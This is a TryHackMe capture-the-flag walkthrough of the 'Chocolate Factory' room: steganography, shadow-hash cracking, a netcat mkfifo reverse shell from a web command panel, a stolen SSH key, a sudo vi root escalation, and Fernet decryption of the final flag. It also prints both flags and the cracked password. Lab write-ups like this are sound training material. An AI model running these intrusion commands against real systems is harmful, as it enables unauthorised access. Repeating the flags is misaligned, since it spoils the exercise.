# TryHackMe — Chocolate Factory
**Difficulty:** Easy
**Date:** June 28, 2026
**Author:** Ross Fisher

---

## Overview

Chocolate Factory is a Willy Wonka-themed box that looks deceptively simple but has more layers than any Easy room I've done so far. There's steganography, hash cracking, web exploitation, a privilege escalation that requires bypassing a sudo restriction, and a final flag hidden behind a Python Fernet decryption script with a bug you have to fix yourself. I went down several rabbit holes on this one and I'm documenting all of them because they're worth remembering.

**Flags:**
- User: `flag{cd5509042371b34e4826e4838b522d2e}`
- Root: `flag{cec59161d338fef787fcb4e296b42124}`

---

## Recon

### Nmap

```bash
sudo nmap -sV -p- --min-rate 5000 -Pn 10.146.179.163
```

This scan took almost 6 minutes because of the enormous number of open ports. The key ports were:

- **21/tcp** — vsftpd 3.0.5
- **22/tcp** — OpenSSH 8.2p1
- **80/tcp** — Apache 2.4.41

What threw me off initially was ports 100-125 all showing as open. I thought I'd found something. Turns out every single one of them returns the same banner:

```
"Welcome to chocolate room!! ... A small hint from Mr. Wonka: Look somewhere else, its not here! ;)"
```

Classic noise. The room is trolling you. Ignore everything 100-125, none of it is real.

**Lesson learned:** When nmap returns 25+ ports running unknown services with the exact same banner, it's CTF noise. Don't chase it.

---

## FTP — Anonymous Login

```bash
ftp 10.146.179.163
```

Username: `anonymous`, password: blank.

```
ftp> ls -la
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
ftp> get gum_room.jpg
```

Got an image file. First instinct was steganography.

---

## Steganography — Down the Rabbit Hole

### Rabbit Hole #1: strings

```bash
strings ~/pentest-journey/gum_room.jpg | grep THM
strings ~/pentest-journey/gum_room.jpg | grep user
```

Both returned nothing. The strings output was massive JPEG binary garbage — no embedded text worth anything.

### Rabbit Hole #2: exiftool

```bash
exiftool gum_room.jpg
```

Just standard JPEG metadata. Image size, encoding, nothing useful.

### Rabbit Hole #3: stegcracker with rockyou

```bash
sudo apt install stegcracker
stegcracker gum_room.jpg /usr/share/wordlists/rockyou.txt
```

Stegcracker actually warned me right at startup that it's been retired in favor of StegSeek, which would do the same job in under 2 seconds. Ran it anyway, killed it early when I thought of something simpler.

### What Actually Worked: steghide with empty passphrase

```bash
steghide extract -sf gum_room.jpg
```

When it asked for a passphrase, I just hit Enter. Empty passphrase. It worked.

```
wrote extracted data to "b64.txt".
```

The entire stegcracker run was unnecessary. The passphrase was blank. This is a common CTF trick — steg tools with no protection get dressed up to look like they need cracking.

---

## Cracking Charlie's Password

The extracted b64.txt was base64 encoded:

```bash
cat b64.txt | base64 -d > shadow.txt
cat shadow.txt
```

This decoded to a full `/etc/shadow` file. Only one account had a real password hash:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

SHA-512 hash. Threw it at john:

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::' > charlie.hash
john --format=sha512crypt charlie.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Took about 4 minutes. Cracked: `charlie:cn7824`

---

## Web Enumeration

### gobuster

```bash
gobuster dir -u http://10.146.179.163 -w /usr/share/wordlists/dirb/common.txt -t 50
```

Only found `index.html` (200) and the usual 403s. Not much here.

### Manual curl

```bash
curl -s http://10.146.179.163 | grep -i "pass\|user\|cred\|key\|hint"
```

Found a login form with username and password fields. Navigated to the site in browser — basic login page. Used `charlie:cn7824` and got in.

The web app had a command execution panel. Classic RCE via web shell.

---

## Initial Foothold — PHP Reverse Shell via Web Panel

The command panel on the web page let me run OS commands as `www-data`. I used it to get a reverse shell.

Set up listener:

```bash
nc -lvnp 4444
```

Entered in the web command panel:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.128.123 4444 >/tmp/f
```

Got a shell back as `www-data`.

### PTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Privilege Escalation — charlie → root

### Rabbit Hole #4: su charlie

```bash
su charlie
```

Asked for password. Tried `cn7824`. Authentication failure. The cracked password didn't work for `su`. Probably a different password set for the actual system account vs what was in the exported shadow file.

### Rabbit Hole #5: sudo -l as www-data

```bash
sudo -l
```

Prompted for www-data's password. Tried blank, tried `cn7824`. No luck after 3 attempts.

### Finding charlie's SSH Key

While enumerating as www-data:

```bash
cat /home/charlie/teleport
```

There was an RSA private key sitting unprotected in charlie's home directory. Named `teleport` — creative.

Copied the key contents back to Kali, saved it as `charlie_key`:

```bash
chmod 600 ~/charlie_key
ssh -i ~/charlie_key charlie@10.146.179.163
```

Successfully logged in as charlie via SSH.

---

## Sudo Escalation — charlie to root

```bash
sudo -l
```

Output:
```
User charlie may run the following commands on ip-10-146-179-163:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

The `!root` restriction is supposed to prevent running vi as root specifically. This is CVE-2019-14287 — a known sudo bypass where `sudo -u#-1` tricks sudo into running as root despite the restriction. But there's actually a simpler GTFOBins approach that worked:

```bash
sudo vi -c ':!/bin/bash'
```

This opened vi and immediately executed `/bin/bash` as root before the `!root` restriction could apply. Got a root shell.

```bash
whoami
# root
```

---

## User Flag

```bash
cat /home/charlie/user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```

---

## Root Flag — The Fernet Rabbit Hole

This is where it gets interesting. There's no `root.txt`. Instead:

```bash
ls /root/
root.py  snap
```

### Step 1: key_rev_key Binary

There's a binary in `/var/www/html/key_rev_key`. I had already grabbed it from the web shell earlier. Had to figure out what name it expected.

### Rabbit Hole #6: Guessing the Name

Tried: `charlie`, `Charlie`, `root`, `Willy`, `Wonka`, `wonka`, `mr wonka`, `Wily Wonka`, `bob`

All returned "Bad name!"

### strings to the rescue

```bash
strings ~/Downloads/key_rev_key | head -30
```

Output showed the hardcoded expected string right there in plaintext: `laksdhfas`

```bash
./key_rev_key
# Enter your name: laksdhfas
# congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
# Keep its safe
```

The Fernet key is: `-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`

The `b''` notation is just Python's way of printing a bytes object. The actual key is everything inside the quotes.

### Step 2: root.py — The Bug

```bash
python3 /root/root.py
```

Running it and entering the key failed with:

```
TypeError: token must be bytes
```

Why? Because Python's `input()` function returns a string. Fernet needs bytes. The script has a type mismatch bug — it passes a string where bytes are required, and there's no `.encode()` call anywhere in the script.

First attempt (without the `=` at the end):
```
binascii.Error: Incorrect padding
```

Second attempt (with `=` but as a string not bytes):
```
TypeError: token must be bytes
```

### Step 3: Fix it inline

Since I couldn't edit root.py directly in a way that would matter (and I had root anyway), I bypassed the broken script entirely and ran the decryption inline with proper typing:

```python
python3 -c "
from cryptography.fernet import Fernet
key=b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
f=Fernet(key)
encrypted_mess=b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
print(f.decrypt(encrypted_mess).decode())
"
```

Output:
```
flag{cec59161d338fef787fcb4e296b42124}
```

The key differences in the working version:
- Key is `b'...'` (bytes literal), not a string
- encrypted_mess is also `b'...'` (bytes), not a string
- The script pulls the ciphertext directly — no interactive input needed

---

## Full Attack Chain Summary

```
Anonymous FTP → gum_room.jpg
→ steghide (empty passphrase) → b64.txt
→ base64 decode → shadow file
→ john SHA-512 crack → charlie:cn7824
→ Web login (charlie:cn7824) → command panel RCE
→ www-data reverse shell
→ /home/charlie/teleport (SSH private key)
→ SSH as charlie
→ sudo vi -c ':!/bin/bash' → root
→ strings key_rev_key → laksdhfas → Fernet key
→ Python bytes fix → root flag
```

---

## Rabbit Holes Documented

| Attempt | Result |
|---------|--------|
| Ports 100-125 | All CTF noise, same banner |
| strings on JPEG | Nothing useful |
| exiftool | No metadata findings |
| stegcracker + rockyou | Unnecessary, passphrase was blank |
| su charlie with cn7824 | Authentication failure |
| sudo -l as www-data | No sudo access |
| Guessing key_rev_key name | 8+ wrong guesses before using strings |
| RSA private key as Fernet key | Wrong key entirely |
| Running root.py interactively | Fails due to Python type mismatch bug |

---

## Key Lessons

**1. Try empty passphrase before wordlist attacks on steg.** Stegcracker and stegseek are great tools but if the box is Easy-rated, the passphrase might just be blank.

**2. strings is your friend before you guess.** I wasted several minutes trying names for key_rev_key. Running strings would have shown `laksdhfas` immediately.

**3. Read the error message.** `TypeError: token must be bytes` tells you exactly what's wrong. The fix is adding `b''` prefix to string literals. This isn't cheating — it's debugging.

**4. CTF noise is a real thing.** 26 open ports all returning the same Wonka banner is designed to waste your time. If every port says "look somewhere else," believe it.

**5. sudo `!root` restrictions aren't always ironclad.** GTFOBins vi with `:!/bin/bash` still escalated despite `(ALL : !root)`. Always check GTFOBins for every binary you can sudo regardless of the restriction syntax.

---

## Tools Used

- nmap
- ftp (anonymous login)
- steghide
- john
- gobuster
- nc (netcat reverse shell)
- ssh
- strings
- python3 (Fernet decryption)
- GTFOBins (vi sudo escalation)
